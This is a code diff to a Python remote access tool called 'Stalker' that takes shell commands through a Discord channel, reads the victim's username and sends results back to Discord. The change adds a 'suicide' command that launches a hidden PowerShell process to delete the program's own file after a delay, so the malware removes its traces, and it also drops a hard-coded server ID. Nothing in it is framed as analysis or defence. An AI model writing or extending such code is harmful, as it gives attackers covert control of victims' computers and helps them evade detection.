@@ -1,4 +1,5 @@
 import os
+import sys
 import time
 import requests
 import subprocess
@@ -14,12 +15,13 @@ class Stalker:
         # Discord Server link
         self.DiscordServer_url = ""
 
-
+        
         self.Shell_url = ""
         self.ShellDelay_sec = 10
 
 
         self.Username = os.getlogin()
+        self.ProgramName = sys.argv[0].split("\\")[-1]
         self.Headers = {"Authorization": self.discord_token}
     
 
@@ -33,6 +35,8 @@ class Stalker:
                 if command == "quit":
                     self.running = False
                     self.SendText("<shell>bye my friend, hopefully i see u soon :)", self.Shell_url)
+                elif command.startswith("suicide"):
+                    self.suicide()
                 elif command.startswith("<shell>"):
                     pass
                 elif command.startswith("cd"):
@@ -53,10 +57,21 @@ class Stalker:
         data = {"content": text}
         requests.post(url, headers=self.Headers, data=data)
 
+    
+    def suicide(self):
+        ps_command = f"""
+        Start-Sleep -Seconds {self.ShellDelay_sec + 15};
+        Remove-Item -Force '{self.ProgramName}'
+        """
+
+        subprocess.Popen(['powershell', '-Command', ps_command], creationflags=subprocess.CREATE_NO_WINDOW)
+
+        self.SendText("<shell>bye my friend :)", self.Shell_url)
+        self.running = False
+
 
     def MakeChannel(self, name):
         payload = {
-            "guild_id": "1246153061517234236",
             "name": name,
             "type": 0
         }
